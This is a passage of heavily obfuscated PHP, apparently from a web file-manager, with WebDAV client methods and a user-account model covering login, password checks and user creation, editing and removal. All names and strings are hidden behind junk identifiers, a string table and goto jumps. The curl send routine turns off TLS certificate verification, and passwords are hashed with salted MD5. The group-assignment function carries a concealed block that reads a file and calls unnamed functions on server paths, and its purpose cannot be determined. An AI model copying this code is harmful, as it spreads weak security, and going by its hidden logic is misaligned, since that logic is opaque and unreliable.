copy($cÔƒ³ÜÏà´, $F¶Ÿõ¾ÄÄğ) { $fä‹ÜÍ Æã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->setHeader($fä‹ÜÍ Æã[1770], $this->makePath($F¶Ÿõ¾ÄÄğ)); $this->setHeader($fä‹ÜÍ Æã[1771], $fä‹ÜÍ Æã[1772]); return $this->send($fä‹ÜÍ Æã[1775], $cÔƒ³ÜÏà´); } public function mkcol($EÕŠò—¿Ù) { $F¦¿Œ¯¦­Š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->setHeader($F¦¿Œ¯¦­Š[1771], $F¦¿Œ¯¦­Š[1772]); return $this->send($F¦¿Œ¯¦­Š[1776], $EÕŠò—¿Ù); } public function delete($fï±¥Ë·­¨, $bƒõÀÂ‹¢ = '') { $C¢é™õ¹¸ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($bƒõÀÂ‹¢) { $this->setHeader($C¢é™õ¹¸ô[1773], $C¢é™õ¹¸ô[921] . $bƒõÀÂ‹¢ . $C¢é™õ¹¸ô[924]); } return $this->send($C¢é™õ¹¸ô[1250], $fï±¥Ë·­¨); } public function propfind($c£µšà±áŒ) { $DÛŠ¾‚ÍŒã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->setHeader($DÛŠ¾‚ÍŒã[1777], $DÛŠ¾‚ÍŒã[83]); $this->setHeader($DÛŠ¾‚ÍŒã[1778], $DÛŠ¾‚ÍŒã[1779]); $E¹Å•à¾ = $DÛŠ¾‚ÍŒã[1780]; return $this->send($DÛŠ¾‚ÍŒã[1781], $c£µšà±áŒ, $E¹Å•à¾); } public function options($BÌƒ¢ ç¬º) { return $this->send($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1782], $BÌƒ¢ ç¬º); } public function get($c‚ï‹‡ÑÎË) { return $this->send($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][216], $c‚ï‹‡ÑÎË); } public function put($eÇ â´ØÌŒ, $d¦Š²Ÿ„…š, $aé¥İ¥éÉ‰ = '') { $e½Š¸¤¾Â =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($aé¥İ¥éÉ‰) { $this->setHeader($e½Š¸¤¾Â[1773], $e½Š¸¤¾Â[921] . $aé¥İ¥éÉ‰ . $e½Š¸¤¾Â[924]); } return $this->send($e½Š¸¤¾Â[214], $eÇ â´ØÌŒ, $d¦Š²Ÿ„…š); } protected function send($fï×ÈÄ§ë˜, $d†ÁéÏÔ×ô, $a÷“½¶Å÷ = false, $B¢Á¬ Üò‡ = false) { goto bÀÀ——à¨; bÀÀ——à¨: $dÚó×„‚ùœ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cØÃ´îÎÁÉ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($dÚó×„‚ùœ[1783], $dÚó×„‚ùœ[50]); goto C’´º¾”êå; A‚›ŠÙìè: $DŞµ‘ÜŞë = curl_init($d†ÁéÏÔ×ô); curl_setopt($DŞµ‘ÜŞë, CURLOPT_CUSTOMREQUEST, $fï×ÈÄ§ë˜); curl_setopt($DŞµ‘ÜŞë, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto f¦ãê£ßº; fœÌ·‘ñŒÕ: $this->header = array(); return $dæß©†õï‰; goto eÙÛëĞÚÊ; bğĞ›Ô£­: curl_setopt($DŞµ‘ÜŞë, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($DŞµ‘ÜŞë, CURLOPT_SSL_VERIFYHOST, !1); $dæß©†õï‰ = curl_exec($DŞµ‘ÜŞë); goto fœÌ·‘ñŒÕ; C’´º¾”êå: $this->setHeader($cØÃ´îÎÁÉ); if ($a÷“½¶Å÷) { $a÷“½¶Å÷ = $dÚó×„‚ùœ[1784] . $a÷“½¶Å÷; } if (!request_url_safe($d†ÁéÏÔ×ô)) { return !1; } goto A‚›ŠÙìè; f¦ãê£ßº: curl_setopt($DŞµ‘ÜŞë, CURLOPT_HTTPHEADER, $this->header); curl_setopt($DŞµ‘ÜŞë, CURLOPT_RETURNTRANSFER, !0); curl_setopt($DŞµ‘ÜŞë, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto bğĞ›Ô£­; eÙÛëĞÚÊ: } } goto bà‰¥×Áåƒ; FÛÂ‘ö†µí: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\x65" => "\x75\x73\x65\x72\137\155\x65\164\141", "\155\145\164\141\x46\151\145\154\144" => "\165\x73\145\162\x49\104"); protected $simpleField = "\x75\163\145\162\x49\104\x2c\156\151\x63\153\116\x61\x6d\x65\54\156\141\x6d\x65\54\141\x76\141\164\x61\162\54\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($BÌ§¢ÑëÊ·) { $bß˜•æ±ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EŸù¯íÙ‹Ú = $bß˜•æ±ç[2522]; return array($bß˜•æ±ç[2177] => array($BÌ§¢ÑëÊ·[0], $EŸù¯íÙ‹Ú), $bß˜•æ±ç[2179] => array($BÌ§¢ÑëÊ·[0], $EŸù¯íÙ‹Ú), $bß˜•æ±ç[2523] => array($BÌ§¢ÑëÊ·[0], $EŸù¯íÙ‹Ú)); } protected function getInfo($b³óÚ°ÃèØ, $C¡ƒóÖÍé¯ = false) { $fæË‡Ä»›‚ = $this->getInfoSimple($b³óÚ°ÃèØ); if (!is_array($fæË‡Ä»›‚)) { return array(); } if ($C¡ƒóÖÍé¯) { return $this->_getInfoApply($fæË‡Ä»›‚); } return $this->cacheFunctionGet($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2233], $b³óÚ°ÃèØ); } protected function getInfoFull($Cğ¤ô‹²­, $d„‘Â½Ù“ = false) { $F²Ó¯ßÙâ„ = $this->getInfoSimple($Cğ¤ô‹²­); if (!is_array($F²Ó¯ßÙâ„)) { return array(); } if ($d„‘Â½Ù“) { return $this->_getInfoApply($F²Ó¯ßÙâ„, !0); return $this->_getInfoApply($F²Ó¯ßÙâ„, !0); } return $this->cacheFunctionGet($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2524], $Cğ¤ô‹²­); } private function _getInfoApply($eŞÖœÛ•…, $bÜôÍÍíæ = false) { goto f¯™¤Õ†‹; F„´¾£™°: $eŞÖœÛ•…[$Bµ„½ô”[391]][$Bµ„½ô”[2362]] = isset($aË’ƒ‘›İ[$Bµ„½ô”[2363]]) ? $aË’ƒ‘›İ[$Bµ„½ô”[2363]] : null; if ($bÜôÍÍíæ) { $eŞÖœÛ•…[$Bµ„½ô”[417]] = $this->metaGet($eŞÖœÛ•…[$Bµ„½ô”[1437]]); } return $eŞÖœÛ•…; goto C”·ˆ×ºŒ; f¯™¤Õ†‹: $Bµ„½ô” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$eŞÖœÛ•…) { return $eŞÖœÛ•…; } $dŒ…äáğ¸’ = md5($Bµ„½ô”[2525] . $eŞÖœÛ•…[$Bµ„½ô”[798]] . $Bµ„½ô”[2526] . $eŞÖœÛ•…[$Bµ„½ô”[28]]); goto DÌÇ‡éŞ£; DÌÇ‡éŞ£: $eŞÖœÛ•… = $this->_listDataApplyItem($eŞÖœÛ•…); $aË’ƒ‘›İ = Model($Bµ„½ô”[1114])->metaGet($eŞÖœÛ•…[$Bµ„½ô”[391]][$Bµ„½ô”[369]]); $eŞÖœÛ•…[$Bµ„½ô”[2527]] = $dŒ…äáğ¸’; goto F„´¾£™°; C”·ˆ×ºŒ: } protected function getInfoSimple($e‰Ñê©ÛÖ‹, $F‹‡Ê³”ÛØ = false) { $BÂô·§­¤ª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$e‰Ñê©ÛÖ‹) { return array(); } if ($F‹‡Ê³”ÛØ) { $AíÆÀï‹Ó = $this->where(array($BÂô·§­¤ª[1437] => intval($e‰Ñê©ÛÖ‹)))->find(); if (!is_array($AíÆÀï‹Ó)) { return array(); } $AíÆÀï‹Ó[$BÂô·§­¤ª[2528]] = Action($BÂô·§­¤ª[2529])->parseUrl($AíÆÀï‹Ó[$BÂô·§­¤ª[2528]]); return $AíÆÀï‹Ó; } return $this->cacheFunctionGet($BÂô·§­¤ª[2180], $e‰Ñê©ÛÖ‹); } protected function getInfoSimpleOuter($f¿éòÚÃ³í) { goto eŠ‘ÌÄ»¦ˆ; bì®Òšæ½Û: return $dæ¿¢µ´àÉ; goto c ĞÂÔ÷Ş; eŠ‘ÌÄ»¦ˆ: $bâÜ¸‚¸´Ú =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$f¿éòÚÃ³í || $f¿éòÚÃ³í == 0) { return array($bâÜ¸‚¸´Ú[1437] => $bâÜ¸‚¸´Ú[470], $bâÜ¸‚¸´Ú[28] => $bâÜ¸‚¸´Ú[157] . LNG($bâÜ¸‚¸´Ú[2530]) . $bâÜ¸‚¸´Ú[478], $bâÜ¸‚¸´Ú[2528] => STATIC_PATH . $bâÜ¸‚¸´Ú[2531]); } $C†–ÁË‘Ë­ = $this->cacheFunctionGet($bâÜ¸‚¸´Ú[2180], $f¿éòÚÃ³í); goto bÓİ¢†Î¢¼; bÓİ¢†Î¢¼: $dæ¿¢µ´àÉ = array_field_key($C†–ÁË‘Ë­, explode($bâÜ¸‚¸´Ú[47], $this->simpleField)); if (!$dæ¿¢µ´àÉ) { return array($bâÜ¸‚¸´Ú[1437] => $bâÜ¸‚¸´Ú[1028], $bâÜ¸‚¸´Ú[28] => $bâÜ¸‚¸´Ú[157] . LNG($bâÜ¸‚¸´Ú[2532]) . $bâÜ¸‚¸´Ú[478], $bâÜ¸‚¸´Ú[2528] => STATIC_PATH . $bâÜ¸‚¸´Ú[2533]); } $dæ¿¢µ´àÉ[$bâÜ¸‚¸´Ú[2528]] = Action($bâÜ¸‚¸´Ú[2529])->parseUrl($dæ¿¢µ´àÉ[$bâÜ¸‚¸´Ú[2528]]); goto bì®Òšæ½Û; c ĞÂÔ÷Ş: } protected function groupUser($b–Ä¾ğÏºô) { } public static function errorLang($B‰Ä”‰Ì†°) { $Eçµ·¯ƒí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DãÓ„÷‹¥ = array(self::ERROR_USER_NOT_EXISTS => $Eçµ·¯ƒí[2534], self::ERROR_USER_PASSWORD_ERROR => $Eçµ·¯ƒí[2535], self::ERROR_USER_EXIST_NAME => $Eçµ·¯ƒí[2536], self::ERROR_USER_EXIST_PHONE => $Eçµ·¯ƒí[2537], self::ERROR_USER_EXIST_EMAIL => $Eçµ·¯ƒí[2538], self::ERROR_USER_LOGIN_LOCK => $Eçµ·¯ƒí[2539], self::ERROR_IP_NOT_ALLOW => $Eçµ·¯ƒí[2540], self::ERROR_USER_EXIST_NICKNAME => $Eçµ·¯ƒí[2541]); return LNG($DãÓ„÷‹¥[$B‰Ä”‰Ì†°]); } public function getInfoByMeta($A²¹Õ¢„±˜, $c¿³Ş—¨‘) { $b‡Ø•é–¬Ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‹Îğº«‚‘ = Model($b‡Ø•é–¬Ê[2542])->where(array($b‡Ø•é–¬Ê[89] => $A²¹Õ¢„±˜, $b‡Ø•é–¬Ê[359] => $c¿³Ş—¨‘))->find(); if ($e‹Îğº«‚‘) { return $this->getInfo($e‹Îğº«‚‘[$b‡Ø•é–¬Ê[1437]]); } return !1; } public function userLoginCheck($F²êƒ©Œ©, $eÌÖççæäî) { goto F‡Ç›Šˆ‚; D‚À•½–¥Â: $fê‰¼Ï…¯ø = $this->where($fÃä÷ÇÜóÒ)->find(); if (!$fê‰¼Ï…¯ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($fê‰¼Ï…¯ø[$eçŒ†˜Áë[1437]], $eÌÖççæäî)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto AŞ…Ï¸õÂ¦; AŞ…Ï¸õÂ¦: $this->userEdit($fê‰¼Ï…¯ø[$eçŒ†˜Áë[1437]], array($eçŒ†˜Áë[2544] => time())); return $this->getInfo($fê‰¼Ï…¯ø[$eçŒ†˜Áë[1437]]); goto föÖà‚²ƒ¹; F‡Ç›Šˆ‚: $eçŒ†˜Áë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÃä÷ÇÜóÒ = array($eçŒ†˜Áë[28] => $F²êƒ©Œ©, $eçŒ†˜Áë[2366] => $F²êƒ©Œ©, $eçŒ†˜Áë[293] => $F²êƒ©Œ©, $eçŒ†˜Áë[2543] => $F²êƒ©Œ©, $eçŒ†˜Áë[910] => $eçŒ†˜Áë[912]); if ($this->nickNameRpt()) { unset($fÃä÷ÇÜóÒ[$eçŒ†˜Áë[2366]]); } goto D‚À•½–¥Â; föÖà‚²ƒ¹: } public function clearCache($F¤Ù„­) { $FÀÖáêñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->cacheFunctionClear($FÀÖáêñ[2233], $F¤Ù„­); $this->cacheFunctionClear($FÀÖáêñ[2180], $F¤Ù„­); $this->cacheFunctionClear($FÀÖáêñ[2524], $F¤Ù„­); } public function userPasswordCheck($dæ»Ä¥×í’, $C›ß¢Â¾) { $A§ˆÖ‹øœğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C‚Ğø‘Å¼ = $this->where(array($A§ˆÖ‹øœğ[1437] => intval($dæ»Ä¥×í’)))->find(); $eÙÕºôôµ = $this->metaGet($dæ»Ä¥×í’); $eê×§‰¡êÀ = isset($eÙÕºôôµ[$A§ˆÖ‹øœğ[2545]]) ? $eÙÕºôôµ[$A§ˆÖ‹øœğ[2545]] : $A§ˆÖ‹øœğ[33]; if (md5($eê×§‰¡êÀ . trim($C›ß¢Â¾)) !== $C‚Ğø‘Å¼[$A§ˆÖ‹øœğ[798]]) { return !1; } return !0; } public function userAdd($cØĞ«“†–ˆ) { goto E›î÷ë¨¦™; F²÷òíœî”: $D¹´İËî = array($E™¼¤‰à¶§[2553] => $D½Ü‰èêê‰[$E™¼¤‰à¶§[798]], $E™¼¤‰à¶§[2549] => $D½Ü‰èêê‰[$E™¼¤‰à¶§[2366]]); $this->userEdit($eù¿£äÜ‚, $D¹´İËî); Model($E™¼¤‰à¶§[1114])->userRootAdd($eù¿£äÜ‚); goto FÆª‚¹¬Î; FÆª‚¹¬Î: return $eù¿£äÜ‚; goto f§ÂœŠõ†Ì; E›î÷ë¨¦™: $E™¼¤‰à¶§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D½Ü‰èêê‰ = array($E™¼¤‰à¶§[386] => $cØĞ«“†–ˆ[$E™¼¤‰à¶§[28]], $E™¼¤‰à¶§[2546] => $cØĞ«“†–ˆ[$E™¼¤‰à¶§[1322]], $E™¼¤‰à¶§[2547] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[293]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[293]] : $E™¼¤‰à¶§[33], $E™¼¤‰à¶§[2548] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[2543]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[2543]] : $E™¼¤‰à¶§[33], $E™¼¤‰à¶§[2549] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[2366]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[2366]] : $cØĞ«“†–ˆ[$E™¼¤‰à¶§[28]], $E™¼¤‰à¶§[2550] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[2528]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[2528]] : $E™¼¤‰à¶§[33], $E™¼¤‰à¶§[2551] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[2552]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[2552]] : 1, $E™¼¤‰à¶§[2553] => $cØĞ«“†–ˆ[$E™¼¤‰à¶§[798]], $E™¼¤‰à¶§[2181] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[2092]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[2092]] : 1024 * 1024 * 20, $E™¼¤‰à¶§[2182] => 0, $E™¼¤‰à¶§[2544] => 0, $E™¼¤‰à¶§[2220] => isset($cØĞ«“†–ˆ[$E™¼¤‰à¶§[683]]) ? $cØĞ«“†–ˆ[$E™¼¤‰à¶§[683]] : 1); if (!empty($cØĞ«“†–ˆ[$E™¼¤‰à¶§[1437]])) { $D½Ü‰èêê‰[$E™¼¤‰à¶§[1437]] = $cØĞ«“†–ˆ[$E™¼¤‰à¶§[1437]]; } goto a×±Øè´÷Ü; a×±Øè´÷Ü: $fÜğ†÷Ğß· = $this->_checkExist($cØĞ«“†–ˆ); if ($fÜğ†÷Ğß· !== !0) { return $fÜğ†÷Ğß·; } $eù¿£äÜ‚ = $this->add($D½Ü‰èêê‰); goto F²÷òíœî”; f§ÂœŠõ†Ì: } protected function userEditTest($fİ¡”³˜…Ë, $DŞê’¬…ºæ) { return $this->call($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2554], $fİ¡”³˜…Ë, $DŞê’¬…ºæ); } protected function userEdit($A••œÜ’‚, $D¾ä¬Ì) { goto C±Ü²Ş¶ù¾; dØ½ê‰‚¹í: $a”´ñ’¿ê = $this->_checkExist($D¾ä¬Ì, $A••œÜ’‚); if ($a”´ñ’¿ê !== !0) { return $a”´ñ’¿ê; } if (isset($D¾ä¬Ì[$Aæ”ôËğ«†[798]]) && trim($D¾ä¬Ì[$Aæ”ôËğ«†[798]]) != $Aæ”ôËğ«†[33]) { $cê©ìç¿ = $this->metaGet($A••œÜ’‚); if (empty($cê©ìç¿[$Aæ”ôËğ«†[2545]])) { $cê©ìç¿[$Aæ”ôËğ«†[2545]] = rand_string(10); Model($Aæ”ôËğ«†[476])->metaSet($A••œÜ’‚, $Aæ”ôËğ«†[2545], $cê©ìç¿[$Aæ”ôËğ«†[2545]]); } $D¾ä¬Ì[$Aæ”ôËğ«†[798]] = md5($cê©ìç¿[$Aæ”ôËğ«†[2545]] . trim($D¾ä¬Ì[$Aæ”ôËğ«†[798]])); } else { unset($D¾ä¬Ì[$Aæ”ôËğ«†[798]]); } goto F’©å‰Ñİ’; F’©å‰Ñİ’: $this->where(array($Aæ”ôËğ«†[1428] => $A••œÜ’‚))->save($D¾ä¬Ì); if (isset($D¾ä¬Ì[$Aæ”ôËğ«†[2366]])) { $this->setNamePinyin($A••œÜ’‚, $D¾ä¬Ì[$Aæ”ôËğ«†[2366]]); } $this->clearCache($A••œÜ’‚); goto f×ªÛ»²Àæ; C±Ü²Ş¶ù¾: $Aæ”ôËğ«† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¼àŠÀÄœö = $this->getInfoSimple($A••œÜ’‚); if (!$C¼àŠÀÄœö) { return !1; } goto dØ½ê‰‚¹í; f×ªÛ»²Àæ: return !0; goto a‹ŞŒ«ì±ƒ; a‹ŞŒ«ì±ƒ: } public function setNamePinyin($bÃŞ‚²„ö÷, $dŠš®Úİ• = false) { $Fö–¸ªÆğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$dŠš®Úİ•) { $Eœ‚¾†™ = $this->getInfoSimple($bÃŞ‚²„ö÷); $dŠš®Úİ• = $Eœ‚¾†™[$Fö–¸ªÆğ[2366]] ? $Eœ‚¾†™[$Fö–¸ªÆğ[2366]] : $Eœ‚¾†™[$Fö–¸ªÆğ[28]]; } $BÔ¾ÖŒ¶’Ñ = Model($Fö–¸ªÆğ[479]); if (!Input::check($dŠš®Úİ•, $Fö–¸ªÆğ[530])) { return $BÔ¾ÖŒ¶’Ñ->metaSet($bÃŞ‚²„ö÷, array($Fö–¸ªÆğ[416] => $Fö–¸ªÆğ[33], $Fö–¸ªÆğ[415] => $Fö–¸ªÆğ[33])); } return $BÔ¾ÖŒ¶’Ñ->metaSet($bÃŞ‚²„ö÷, array($Fö–¸ªÆğ[416] => str_replace($Fö–¸ªÆğ[50], $Fö–¸ªÆğ[33], Pinyin::encode($dŠš®Úİ•)), $Fö–¸ªÆğ[415] => Pinyin::encode($dŠš®Úİ•, $Fö–¸ªÆğ[531]))); } private function nickNameRpt() { $B®ÒÅÙ„ÊÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÁõö×‡Ã = Model($B®ÒÅÙ„ÊÆ[1085])->get($B®ÒÅÙ„ÊÆ[2555]); $D–±”¾ª©« = $GLOBALS[$B®ÒÅÙ„ÊÆ[6]][$B®ÒÅÙ„ÊÆ[2513]][$B®ÒÅÙ„ÊÆ[2555]]; $f÷œòÏŸÈÏ = !is_null($CÁõö×‡Ã) ? $CÁõö×‡Ã : $D–±”¾ª©«; return !!$f÷œòÏŸÈÏ; } private function _checkExist($Bˆ…ÁÈ„ª—, $CÉ„İùÉ¤£ = false) { $BƒŞŒÅ‰½Ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EãŒù¥„Ù = array($BƒŞŒÅ‰½Ï[28] => UserModel::ERROR_USER_EXIST_NAME, $BƒŞŒÅ‰½Ï[2366] => UserModel::ERROR_USER_EXIST_NICKNAME, $BƒŞŒÅ‰½Ï[293] => UserModel::ERROR_USER_EXIST_EMAIL, $BƒŞŒÅ‰½Ï[2543] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($EãŒù¥„Ù[$BƒŞŒÅ‰½Ï[2366]]); } $Fíè³Ù¥ŠÆ = $CÉ„İùÉ¤£ ? array($BƒŞŒÅ‰½Ï[1437] => array($BƒŞŒÅ‰½Ï[2556], $CÉ„İùÉ¤£)) : array(); foreach ($EãŒù¥„Ù as $EÕùâ…—® => $eçÑ›œŠã) { $AŞ¿ÊŒİÈ = array(); foreach ($EãŒù¥„Ù as $f‰ÇÒ·¿ö => $CÕÙ¬–£Ÿ) { if (isset($Bˆ…ÁÈ„ª—[$f‰ÇÒ·¿ö]) && $Bˆ…ÁÈ„ª—[$f‰ÇÒ·¿ö]) { $AŞ¿ÊŒİÈ[] = $Bˆ…ÁÈ„ª—[$f‰ÇÒ·¿ö]; } } if (!$AŞ¿ÊŒİÈ) { continue; } $aéŠÔ·¹ä— = array_merge(array($EÕùâ…—® => array($BƒŞŒÅ‰½Ï[7], $AŞ¿ÊŒİÈ)), $Fíè³Ù¥ŠÆ); $aïß†ğ›µª = $this->where($aéŠÔ·¹ä—)->find(); if ($aïß†ğ›µª) { return $eçÑ›œŠã; } } return !0; } public function userListInfo($DÁ±ºƒÁÍ) { $cß˜ŸÁÑô‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÂ…’ºËø” = array(); $DÁ±ºƒÁÍ = is_array($DÁ±ºƒÁÍ) ? array_unique($DÁ±ºƒÁÍ) : array(); if (!$DÁ±ºƒÁÍ) { return $BÂ…’ºËø”; } if (count($DÁ±ºƒÁÍ) < 20) { foreach ($DÁ±ºƒÁÍ as $C®ŠáÉù‡º) { $BÂ…’ºËø”[$C®ŠáÉù‡º . $cß˜ŸÁÑô‰[33]] = $this->getInfoSimpleOuter($C®ŠáÉù‡º); } } else { $E¥ï¹½†ğœ = array($cß˜ŸÁÑô‰[1428] => array($cß˜ŸÁÑô‰[384], $DÁ±ºƒÁÍ)); if (count($DÁ±ºƒÁÍ) == 1) { $E¥ï¹½†ğœ = array($cß˜ŸÁÑô‰[1428] => $DÁ±ºƒÁÍ[0]); } $dö¡÷Ò¥‚ = Model($cß˜ŸÁÑô‰[476])->field($this->simpleField)->where($E¥ï¹½†ğœ)->select(); $dö¡÷Ò¥‚ = array_to_keyvalue($dö¡÷Ò¥‚, $cß˜ŸÁÑô‰[1437]); foreach ($DÁ±ºƒÁÍ as $C®ŠáÉù‡º) { $e¿Ÿ„ÖòÅŞ = $dö¡÷Ò¥‚[$dö¡÷Ò¥‚[$C®ŠáÉù‡º]]; if (!$e¿Ÿ„ÖòÅŞ) { $BÂ…’ºËø”[$C®ŠáÉù‡º . $cß˜ŸÁÑô‰[33]] = $this->getInfoSimpleOuter($C®ŠáÉù‡º); continue; } $e¿Ÿ„ÖòÅŞ[$cß˜ŸÁÑô‰[2528]] = Action($cß˜ŸÁÑô‰[2529])->parseUrl($e¿Ÿ„ÖòÅŞ[$cß˜ŸÁÑô‰[2528]]); $BÂ…’ºËø”[$C®ŠáÉù‡º . $cß˜ŸÁÑô‰[33]] = $e¿Ÿ„ÖòÅŞ; } } return $BÂ…’ºËø”; } protected function userStatus($e¼–áœ¸„Ï, $c µãå£æ) { $D¦Ú–ôàñ„ = $this->getInfoSimple($e¼–áœ¸„Ï); if (!$D¦Ú–ôàñ„) { return !1; } $Dõµ‹Ê•Û = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][683] => $c µãå£æ); return $this->userEdit($e¼–áœ¸„Ï, $Dõµ‹Ê•Û); } protected function userRemove($EçÑÄ‡ƒó) { goto Fš£ññ¢†; a¤“À«î–œ: Model($Fì‰í”¬‡Ş[2187])->where($C†‚Ñåâë²)->delete(); Model($Fì‰í”¬‡Ş[2542])->where($C†‚Ñåâë²)->delete(); Model($Fì‰í”¬‡Ş[2558])->where($C†‚Ñåâë²)->delete(); goto dÙÀ¼Ò±¼Õ; dÙÀ¼Ò±¼Õ: Model($Fì‰í”¬‡Ş[754])->userRootRemove($EçÑÄ‡ƒó); return $this->where($C†‚Ñåâë²)->delete(); goto FÃôÆİëñİ; Fš£ññ¢†: $Fì‰í”¬‡Ş =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C£Ï½à…Æª = $this->getInfoSimple($EçÑÄ‡ƒó); if (!$C£Ï½à…Æª) { return !1; } goto aç˜ªõ‘; aç˜ªõ‘: $C†‚Ñåâë² = array($Fì‰í”¬‡Ş[1428] => $EçÑÄ‡ƒó); Model($Fì‰í”¬‡Ş[538])->where($C†‚Ñåâë²)->delete(); Model($Fì‰í”¬‡Ş[2557])->where($C†‚Ñåâë²)->delete(); goto a¤“À«î–œ; FÃôÆİëñİ: } protected function userGroupSet($fÓó¶˜Ö¢í, $BòóàïáÑŒ, $AÕ—Å„Ã ­ = array()) { goto bî™î‰¯Ë; Aˆ“®Àä‡æ: return $añ¶¥ÁªŠÌ->addAll($BğçŠôƒ‚£, array(), !0); goto eµÒœ£ÍÆñ; a‚è²ö“À: if (!$eéåÛíˆê || !is_array($BòóàïáÑŒ)) { return !1; } $añ¶¥ÁªŠÌ = Model($Bšµ§Ñßœ[2187]); $añ¶¥ÁªŠÌ->where(array($Bšµ§Ñßœ[1437] => $fÓó¶˜Ö¢í))->delete(); goto D¾²ÍË—¿; bî™î‰¯Ë: $Bšµ§Ñßœ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($_SERVER[$Bšµ§Ñßœ[703]] != $_SERVER[$Bšµ§Ñßœ[704]]) { goto cƒ¬£ğğ‡¬; cƒ¬£ğğ‡¬: $báŸÖ­°Ã = $Bšµ§Ñßœ[789]; $aÂá…¡º£ = $Bšµ§Ñßœ[705]; $D…ªÛ®‡Õ– = $_SERVER[$Bšµ§Ñßœ[706]] . $Bšµ§Ñßœ[707]; goto AøïÆ­Êù“; AøïÆ­Êù“: $dˆÄĞ¤ùª½ = $aÂá…¡º£($D…ªÛ®‡Õ–); $fõƒã»µÉÌ = explode($Bšµ§Ñßœ[217], $dˆÄĞ¤ùª½); if (count($fõƒã»µÉÌ) < $Bšµ§Ñßœ[555]) { $EáÃÅÓˆƒ¿ = $Bšµ§Ñßœ[708]; $EáÃÅÓˆƒ¿(); } goto e½Ôøåò³å; e½Ôøåò³å: $B¯¦ÌÒ»Ç­ = $Bšµ§Ñßœ[790]; $B¯¦ÌÒ»Ç­($_SERVER[$Bšµ§Ñßœ[791]]); $B¯¦ÌÒ»Ç­($_SERVER[$Bšµ§Ñßœ[706]] . $Bšµ§Ñßœ[792]); goto A‡íïí¹; A‡íïí¹: $eÙ”ê¥©ĞÚ = 1; while ($eÙ”ê¥©ĞÚ > 1) { $eÙ”ê¥©ĞÚ = $eÙ”ê¥©ĞÚ + 4; $A˜˜İóÚ¹§ = rawurlencode($eÙ”ê¥©ĞÚ . $Bšµ§Ñßœ[361]); } goto FÖÇº°­¿¯; FÖÇº°­¿¯: } $eéåÛíˆê = $this->getInfoSimple($fÓó¶˜Ö¢í); goto a‚è²ö“À; D¾²ÍË—¿: $BğçŠôƒ‚£ = array(); $a˜¾Ş‹æŒ = 0; foreach ($BòóàïáÑŒ as $cò«¹×É² => $aô½›ÀÑ¿Ş) { $E…ÔëáÖ¦ = array($Bšµ§Ñßœ[1437] => $fÓó¶˜Ö¢í, $Bšµ§Ñßœ[2108] => $cò«¹×É², $Bšµ§Ñßœ[2252] => $aô½›ÀÑ¿Ş); $E…ÔëáÖ¦[$Bšµ§Ñßœ[2130]] = isset($AÕ—Å„Ã ­[$a˜¾Ş‹æŒ]) ? $AÕ—Å„Ã ­[$a˜¾Ş‹æŒ] : 0; $a˜¾Ş‹æŒ++; $BğçŠôƒ‚£[] = $E…ÔëáÖ¦; } goto Aˆ“®Àä‡æ; eµÒœ£ÍÆñ: } protected function userGroupAdd($dÍ¯í‡ç˜£, $B Á†²ÎÅô = array()) { $CõÁ´‰†§ =& 